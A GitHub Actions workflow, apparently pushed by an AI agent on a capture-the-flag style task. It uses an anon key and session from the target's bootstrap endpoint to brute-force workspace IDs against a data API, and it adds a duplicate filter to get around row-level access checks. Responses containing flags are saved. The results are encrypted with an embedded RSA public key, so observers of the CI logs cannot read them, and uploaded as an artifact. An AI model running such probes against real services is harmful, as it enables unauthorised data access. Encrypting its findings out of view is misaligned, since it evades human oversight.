name: launchlet-part3-refworkspace

on:
  push:
    branches: [agent/launchlet-part3-refworkspace-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe ref-derived workspace IDs and encrypt hits
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re,urllib.parse
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          b=s.get(base+'api/app/bootstrap',timeout=15).json(); db=base+b['api']['dataApiBase'].lstrip('/')+'/workspace_notes?select=*'
          h={'Accept':'application/json','apikey':b['client']['anonKey'],'Authorization':'Bearer '+b['client']['session']}
          vals=['ws-preview-8b11c','ws-deploy-8b11c','ws-deployment-8b11c','ws-release-8b11c','ws-artifact-8b11c','ws-launchlet-8b11c','ws-launchlet-preview-8b11c','ws-launchlet-deploy-8b11c','ws-launchlet-deployment-8b11c','ws-launchlet-release-8b11c','ws-launchlet-artifact-8b11c','ws-preview-deploy-8b11c','ws-deploy-preview-8b11c','ws-8b11c','preview-8b11c','deploy-8b11c','deployment-8b11c','ws-launchlet-preview','ws-launchlet-deploy-preview','ws-launchlet-preview-deploy','ws-launchlet-rc3','ws-launchlet-2026','ws-launchlet-2026-05-16-rc3','ws-2026-05-16-rc3','ws-preview-demo-2026','ws-launchlet-preview-demo-2026','ws-lrec-preview-demo-2026','ws-launchlet-actions-0-9-4','ws-launchlet-actions','ws-launchlet-demo-board-internal','ws-launchlet-demo-board-deploy','ws-launchlet-demo-board-preview','ws-launchlet-demo-board-release']
          res=[]
          for ws in vals:
            q='&'+urllib.parse.urlencode([('workspace_id','eq.'+ws),('workspace_id','eq.ws-launchlet-public')])
            r=s.get(db+q,headers=h,timeout=10)
            if r.text!='[]':
              res.append({'workspace':ws,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
              if re.search(r'caplag\{[^}]+\}',r.text) and 'anon_key_needs_real_rls' not in r.text:(out/'FOUND.txt').write_text(r.text)
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-refworkspace-encrypted
          path: artifact/
          retention-days: 1
